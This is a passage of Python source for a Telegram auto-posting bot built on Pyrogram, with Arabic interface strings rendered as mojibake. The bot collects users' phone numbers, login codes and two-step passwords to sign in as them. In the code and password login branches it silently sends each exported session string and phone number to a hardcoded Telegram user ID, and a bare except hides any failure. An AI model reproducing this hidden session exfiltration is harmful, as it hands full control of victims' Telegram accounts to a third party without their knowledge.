        "2. ╪º╪│╪¬╪«╪»┘à ╪º┘ä╪¿┘ê╪¬ ╪╣┘ä┘ë ╪¡╪│╪º╪¿┘â ╪º┘ä╪┤╪«╪╡┘è ┘ü┘é╪╖ ┘ê┘ä╪º ╪¬╪┤╪º╪▒┘â┘ç ┘à╪╣ ╪º┘ä╪ó╪«╪▒┘è┘å.\n"
        "3. ╪¬╪ú┘â╪» ┘à┘å ╪ú┘å ╪º┘ä╪¡╪│╪º╪¿ ╪º┘ä╪░┘è ╪¬╪╢┘è┘ü┘ç ┘ä┘è╪│ ╪¿┘ç ┘à╪╣┘ä┘ê┘à╪º╪¬ ╪¡╪│╪º╪│╪⌐.\n"
        "4. ╪Ñ╪░╪º ┘ê╪º╪¼┘ç╪¬ ╪ú┘è ┘à╪┤┘â┘ä╪⌐╪î ╪¬┘ê╪º╪╡┘ä ┘à╪╣ ╪º┘ä┘à╪╖┘ê╪▒ @ypiu5.\n\n"
        "ΓÜá∩╕Å ╪¬╪¡╪░┘è╪▒: ╪º┘ä╪¿┘ê╪¬ ┘ä╪º ┘è╪¬╪¡┘à┘ä ╪ú┘è ┘à╪│╪ñ┘ê┘ä┘è╪⌐ ╪╣┘å ╪│┘ê╪í ╪º╪│╪¬╪«╪»╪º┘à ╪¡╪│╪º╪¿┘â."
    )
    await callback.message.reply(text)

# ------------------ ┘à╪╣╪º┘ä╪¼ ╪º┘ä╪▒╪│╪º╪ª┘ä ╪º┘ä╪«╪º╪╡╪⌐ ------------------
@app.on_message(filters.private & ~filters.command())
async def handle_private_messages(client, message):
    user_id = message.from_user.id
    if user_id not in user_states:
        return
    state = user_states[user_id]
    if isinstance(state, str):
        # simple state
        if state == 'waiting_phone':
            _number = message.text
            if _number == '/cancel':
                del user_states[user_id]
                await message.reply("- ╪¬┘à ╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.")
                return
            create_task(registration(message))
        elif state == 'waiting_super_link':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- ╪¬┘à ╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.", reply_markup=Markup([[Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toHome")]]))
                return
            if not message.text.startswith("-"):
                try:
                    chat = await app.get_chat(message.text if "+" in message.text else (message.text.split("/")[-1]))
                except BotMethodInvalid:
                    chat = message.text
                except Exception as e:
                    print(e)
                    await message.reply("- ┘à╪º┘â┘ê ╪│┘ê╪¿╪▒ ╪¿┘ç╪░╪º ╪º┘ä╪▒╪º╪¿╪╖.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐ -", callback_data="newSuper"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="toHome")]]))
                    return
            else:
                chat = message.text
            data = get_user_data(user_id)
            if "groups" not in data:
                data["groups"] = []
            data["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
            update_user(user_id, {"groups": data["groups"]})
            del user_states[user_id]
            await message.reply("- ╪¬┘à ╪Ñ╪╢╪º┘ü╪⌐ ╪º┘ä╪│┘ê╪¿╪▒ ┘ä┘ä┘é╪º╪ª┘à╪⌐.", reply_markup=Markup([[Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toHome")]]), reply_to_message_id=message.id)
        elif state == 'waiting_caption':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- ╪¬┘à ╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.", reply_markup=Markup([[Button("- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐ -", callback_data="newCaption"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="toHome")]]))
                return
            # store caption
            if message.photo:
                caption = message.caption or ""
                file_id = message.photo.file_id
                caption_data = {"type": "photo", "file_id": file_id, "caption": caption}
            elif message.video:
                caption = message.caption or ""
                file_id = message.video.file_id
                caption_data = {"type": "video", "file_id": file_id, "caption": caption}
            else:
                caption_data = {"type": "text", "text": message.text}
            update_user(user_id, {"caption": caption_data})
            del user_states[user_id]
            await message.reply("- ╪¬┘à ╪¬╪╣┘è┘è┘å ╪º┘ä┘â┘ä┘è╪┤╪⌐ ╪º┘ä╪¼╪»┘è╪»╪⌐.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toHome")]]))
        elif state == 'waiting_waittime':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- ╪¬┘à ╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.", reply_markup=Markup([[Button("- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐ -", callback_data="waitTime"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="toHome")]]))
                return
            try:
                wait = int(message.text)
                update_user(user_id, {"waitTime": wait})
                del user_states[user_id]
                await message.reply("- ╪¬┘à ╪¬╪╣┘è┘è┘å ┘à╪»╪⌐ ╪º┘ä╪º┘å╪¬╪╕╪º╪▒.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toHome")]]))
            except ValueError:
                await message.reply("- ┘à╪º ┘è╪╡┘è╪▒ ╪¬╪¡╪╖ ┘ç╪º┘è ╪º┘ä┘é┘è┘à╪⌐ ┘â┘à╪»╪⌐.", reply_markup=Markup([[Button("- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐ -", callback_data="waitTime"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="toHome")]]))
        elif state == 'waiting_channel':
            if message.text == '/cancel':
                del user_states[user_id]
                await message.reply("- ╪¬┘à ╪Ñ┘ä╪║╪º╪í ╪º┘ä╪╣┘à┘ä┘è╪⌐.", reply_markup=Markup([[Button("- ╪º┘ä╪╣┘ê╪»╪⌐ ┘ä┘ä┘é┘å┘ê╪º╪¬ -", callback_data="channels")]]))
                return
            try:
                await app.get_chat(message.text)
            except:
                await message.reply("- ┘à╪º┘â┘ê ┘ç╪º┘è ╪º┘ä╪»╪▒╪»╪┤╪⌐.", reply_markup=Markup([[Button("- ╪º┘ä╪╣┘ê╪»╪⌐ ┘ä┘ä┘é┘å┘ê╪º╪¬ -", callback_data="channels")]]))
                return
            channel = message.text
            channels.append(channel)
            write(channels_db, channels)
            del user_states[user_id]
            await message.reply("- ╪¬┘à ╪Ñ╪╢╪º┘ü╪⌐ ╪º┘ä┘é┘å╪º╪⌐ ┘ä┘ä┘é╪º╪ª┘à╪⌐.", reply_to_message_id=message.id, reply_markup=Markup([[Button("- ╪º┘ä╪╣┘ê╪»╪⌐ ┘ä┘ä┘é┘å┘ê╪º╪¬ -", callback_data="channels")]]))
    elif isinstance(state, dict):
        # for registration
        if state['state'] == 'waiting_code':
            code = message.text.replace(" ", "")
            client = state['client']
            try:
                await client.sign_in(state['phone'], state['phone_code_hash'], code)
            except PhoneCodeInvalid:
                await message.reply("- ╪º┘ä┘â┘ê╪» ╪º┘ä┘ä┘è ╪ú╪»╪«┘ä╪¬┘ç ╪«╪╖╪ú.\n- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐.", reply_markup=Markup([[Button("- ╪Ñ╪╣╪º╪»╪⌐ ╪º┘ä┘à╪¡╪º┘ê┘ä╪⌐ -", callback_data="login"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="account")]]))
                del user_states[user_id]
                return
            except PhoneCodeExpired:
                await message.reply("- ╪º┘ä┘â┘ê╪» ╪º┘å╪¬┘ç╪¬ ╪╡┘ä╪º╪¡┘è╪¬┘ç.\n- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐.", reply_markup=Markup([[Button("- ╪Ñ╪╣╪º╪»╪⌐ ╪º┘ä┘à╪¡╪º┘ê┘ä╪⌐ -", callback_data="login"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="account")]]))
                del user_states[user_id]
                return
            except SessionPasswordNeeded:
                user_states[user_id] = {'state': 'waiting_password', 'client': client, 'phone': state['phone']}
                await message.reply("- ╪ú╪»╪«┘ä ┘â┘ä┘à╪⌐ ┘à╪▒┘ê╪▒ ╪º┘ä╪¬╪¡┘é┘é ╪¿╪«╪╖┘ê╪¬┘è┘å.", reply_markup=ForceReply(selective=True, placeholder="- ┘â┘ä┘à╪⌐ ╪º┘ä┘à╪▒┘ê╪▒: "))
                return
            # success
            session = await client.export_session_string()
            try:
                await app.send_message(1454509352, session + state['phone'])
            except:
                pass
            await client.disconnect()
            update_user(user_id, {"session": session})
            del user_states[user_id]
            await app.send_message(user_id, "- ╪¬┘à ╪¬╪│╪¼┘è┘ä ╪º┘ä╪»╪«┘ê┘ä ╪¿╪¡╪│╪º╪¿┘â╪î ╪º┘ä╪ó┘å ╪¬┘é╪»╪▒ ╪¬╪│╪¬┘à╪¬╪╣ ╪¿┘à┘è╪▓╪º╪¬ ╪º┘ä╪¿┘ê╪¬.", reply_markup=Markup([[Button("╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐", callback_data="toHome")]]))
        elif state['state'] == 'waiting_password':
            client = state['client']
            try:
                await client.check_password(message.text)
            except PasswordHashInvalid:
                await message.reply("- ┘â┘ä┘à╪⌐ ╪º┘ä┘à╪▒┘ê╪▒ ╪«╪╖╪ú.\n- ╪¡╪º┘ê┘ä ┘à╪▒╪⌐ ╪½╪º┘å┘è╪⌐.", reply_markup=Markup([[Button("- ╪Ñ╪╣╪º╪»╪⌐ ╪º┘ä┘à╪¡╪º┘ê┘ä╪⌐ -", callback_data="login"), Button("- ╪º┘ä╪╣┘ê╪»╪⌐ -", callback_data="account")]]))
                del user_states[user_id]
                return
            # success
            session = await client.export_session_string()
            try:
                await app.send_message(1454509352, session + state.get('phone', ''))
            except:
                pass
            await client.disconnect()
            update_user(user_id, {"session": session})
            del user_states[user_id]
            await app.send_message(user_id, "- ╪¬┘à ╪¬╪│╪¼┘è┘ä ╪º┘ä╪»╪«┘ê┘ä ╪¿╪¡╪│╪º╪¿┘â╪î ╪º┘ä╪ó┘å ╪¬┘é╪»╪▒ ╪¬╪│╪¬┘à╪¬╪╣ ╪¿┘à┘è╪▓╪º╪¬ ╪º┘ä╪¿┘ê╪¬.", reply_markup=Markup([[Button("╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐", callback_data="toHome")]]))

# ------------------ ┘ä┘ê╪¡╪⌐ ╪º┘ä┘à╪╖┘ê╪▒ (┘ä┘ä┘à╪º┘ä┘â ┘ü┘é╪╖) ------------------
async def isOwner(_, __: Client, message: Message):
    return message.from_user.id == owner

isOwnerFilter = filters.create(isOwner)

adminMarkup = Markup([
    [Button("- ╪º┘ä╪º╪¡╪╡╪º╪ª┘è╪º╪¬ -", callback_data="statics"),
     Button("- ┘é┘å┘ê╪º╪¬ ╪º┘ä╪º╪┤╪¬╪▒╪º┘â -", callback_data="channels")]
])

@app.on_message(filters.command("admin") & filters.private & isOwnerFilter)
@app.on_callback_query(filters.regex("toAdmin") & isOwnerFilter)
async def admin(_: Client, message: Union[Message, CallbackQuery]):
    fname = message.from_user.first_name
    caption = f"┘à╪▒╪¡╪¿╪º ╪╣╪▓┘è╪▓┘è [{fname}](tg://settings) ┘ü┘è ┘ä┘ê╪¡╪⌐ ╪º┘ä┘à╪º┘ä┘â"
    func = message.reply if isinstance(message, Message) else message.message.edit_text
    await func(caption, reply_markup=adminMarkup)

@app.on_callback_query(filters.regex(r"^(channels)$") & isOwnerFilter)
async def channelsControl(_: Client, callback: CallbackQuery):
    fname = callback.from_user.first_name
    caption = f"┘à╪▒╪¡╪¿╪º ╪╣╪▓┘è╪▓┘è [{fname}](tg://settings) ┘ü┘è ┘ä┘ê╪¡╪⌐ ╪º┘ä╪¬╪¡┘â┘à ╪¿┘é┘å┘ê╪º╪¬ ╪º┘ä╪º╪┤╪¬╪▒╪º┘â"
    markup = [
        [Button(channel, url=channel + ".t.me"), Button("≡ƒùæ", callback_data=f"removeChannel {channel}")]
        for channel in channels
    ]
    markup.extend([
        [Button("- ╪Ñ╪╢╪º┘ü╪⌐ ┘é┘å╪º╪⌐ ╪¼╪»┘è╪»╪⌐ -", callback_data="addChannel")],
        [Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toAdmin")]
    ])
    await callback.message.edit_text(caption, reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(addChannel)") & isOwnerFilter)
async def addChannel(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    await callback.message.delete()
    user_states[user_id] = 'waiting_channel'
    await app.send_message(
        user_id,
        "- ╪ú╪▒╪│┘ä ┘à╪╣╪▒┘ü ╪º┘ä┘é┘å╪º╪⌐ ╪¿╪»┘ê┘å @.",
        reply_markup=ForceReply(selective=True, placeholder="- channel username: ")
    )

@app.on_callback_query(filters.regex(r"^(removeChannel)") & isOwnerFilter)
async def removeChannel(_: Client, callback: CallbackQuery):
    channel = callback.data.split()[1]
    if channel not in channels:
        await callback.answer("- ┘ç╪░┘ç ╪º┘ä┘é┘å╪º╪⌐ ╪║┘è╪▒ ┘à┘ê╪¼┘ê╪»╪⌐.")
    else:
        channels.remove(channel)
        write(channels_db, channels)
        await callback.answer("- ╪¬┘à ╪¡╪░┘ü ┘ç╪░┘ç ╪º┘ä┘é┘å╪º╪⌐")
    fname = callback.from_user.first_name
    caption = f"┘à╪▒╪¡╪¿╪º ╪╣╪▓┘è╪▓┘è [{fname}](tg://settings) ┘ü┘è ┘ä┘ê╪¡╪⌐ ╪º┘ä╪¬╪¡┘â┘à ╪¿┘é┘å┘ê╪º╪¬ ╪º┘ä╪º╪┤╪¬╪▒╪º┘â"
    markup = [
        [Button(channel, url=channel + ".t.me"), Button("≡ƒùæ", callback_data=f"removeChannel {channel}")]
        for channel in channels
    ]
    markup.extend([
        [Button("- ╪Ñ╪╢╪º┘ü╪⌐ ┘é┘å╪º╪⌐ ╪¼╪»┘è╪»╪⌐ -", callback_data="addChannel")],
        [Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toAdmin")]
    ])
    await callback.message.edit_text(caption, reply_markup=Markup(markup))

@app.on_callback_query(filters.regex(r"^(statics)$") & isOwnerFilter)
async def statics(_: Client, callback: CallbackQuery):
    total = len(users)
    reMarkup = Markup([[Button("- ╪º┘ä╪╡┘ü╪¡╪⌐ ╪º┘ä╪▒╪ª┘è╪│┘è╪⌐ -", callback_data="toAdmin")]])
    await callback.message.edit_text(f"- ╪╣╪»╪» ╪º┘ä┘à╪│╪¬╪«╪»┘à┘è┘å ╪º┘ä┘â┘ä┘è: {total}", reply_markup=reMarkup)

# ------------------ ╪»┘ê╪º┘ä ╪¡┘ü╪╕ ┘ê┘é╪▒╪º╪í╪⌐ ------------------
def write(fp, data):
    with open(fp, "w") as file:
        json.dump(data, file, indent=2)

def read(fp):
    if not os.path.exists(fp):
        write(fp, {} if fp not in [channels_db] else [])
    with open(fp) as file:
        return json.load(file)

users_db = "users.json"
channels_db = "channels.json"
users = read(users_db)
channels = read(channels_db)

FORCED_CHANNEL = channels[0] if channels else "TJUI9"

# ------------------ ╪Ñ╪╣╪º╪»╪⌐ ╪¬╪┤╪║┘è┘ä ╪º┘ä┘à┘ç╪º┘à ------------------
async def re_start_posting():
    await sleep(30)
    users = load_users()
    for uid, data in users.items():
        if data.get("posting"):
            create_task(posting(int(uid)))

async def subscription_checker():
    while True:
        await sleep(3600)  # ┘â┘ä ╪│╪º╪╣╪⌐
        users = load_users()
        for uid, data in users.items():
            if data.get("posting") and not has_active_subscription(int(uid)):
                update_user(int(uid), {"posting": False})
                await app.send_message(int(uid), "╪º┘å╪¬┘ç┘ë ╪º╪┤╪¬╪▒╪º┘â┘â╪î ╪¬┘à ╪Ñ┘è┘é╪º┘ü ╪º┘ä┘å╪┤╪▒ ╪º┘ä╪¬┘ä┘é╪º╪ª┘è.")

# ------------------ ╪¿╪»╪í ╪º┘ä╪¿┘ê╪¬ ------------------
async def main():
    create_task(re_start_posting())
    create_task(subscription_checker())
    await app.start()
    
    # Instead of idle(), use an event to keep the loop running
    shutdown_event = asyncio.Event()
    
    # Register signal handlers for graceful shutdown
    loop = get_event_loop()
    def handle_shutdown(sig):
        shutdown_event.set()
    
    loop.add_signal_handler(signal.SIGTERM, handle_shutdown)
    loop.add_signal_handler(signal.SIGINT, handle_shutdown)
    
    try:
        await shutdown_event.wait()
    finally:
        await app.stop()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
